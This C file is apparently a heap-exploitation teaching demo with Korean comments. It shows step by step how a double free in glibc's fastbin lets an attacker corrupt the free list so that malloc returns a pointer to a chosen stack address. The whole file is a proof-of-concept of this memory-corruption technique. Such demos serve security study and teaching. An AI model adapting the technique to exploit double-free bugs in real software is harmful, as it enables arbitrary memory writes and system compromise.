#include <stdio.h>
#include <stdlib.h>

int main(){

    printf("This file extends on fastbin_dup.c by tricking malloc into\n" "returning a pointer to a controlled location (in this case, the stack).\n");
    // 이 파일은 fastbin_dup의 확장이다. malloc을 속여서 pointer를 컨트롤된 위치에 반환한다. (이 경우 스택)
    
    unsigned long long stack_var; 

    printf("The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);
    // malloc이 반환할 주소는 000000000061FE00(8+(char *)&stack_var)이다.

    printf("Allocating 3 buffers. \n");
    // 3개의 buffer를 할당

    int *a = malloc(8);
    int *b = malloc(8);
    int *c = malloc(8);

    printf("1st malloc(8) : %p\n", a);
    printf("2nd malloc(8) : %p\n", b);
    printf("3rd malloc(8) : %p\n", c);
    // 1st malloc(8) : 0000000000C81440
    // 2nd malloc(8) : 0000000000C81460
    // 3rd malloc(8) : 0000000000C81480

    printf("Freeing the first one...\n");
    free(a);

    printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
    // free(a);

    printf("So, instead, we'll free %p.\n", b);
    free(b);

    printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
    free(a);

    printf("Now the free list has [%p, %p, %p].\nwe'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
    //

    unsigned long long *d = malloc(8);

    printf("1st malloc(8): %p\n", d); 
    printf("2nd malloc(8): %p\n", malloc(8)); 
    printf("Now the free list has [ %p ].\n", a);


    printf("Now, we have access to %p while it remains at the head  of the free list.\nso now we are writing a fake free size (in this case, 0x20) to the stack,\nso that malloc will think there is a free chunk there and agree to\nreturn a pointer to it.\n", a);

    stack_var = 0x20;
    //  000000000061FDF8: ...
    //  000000000061FE00: 0x20
    printf("Now, we overwrite the first 8 bytes of the data at %p to point right after the 0x20.\n", a); 
    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

    printf("3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8)); 
    printf("4rd malloc(8): %p\n", malloc(8));
}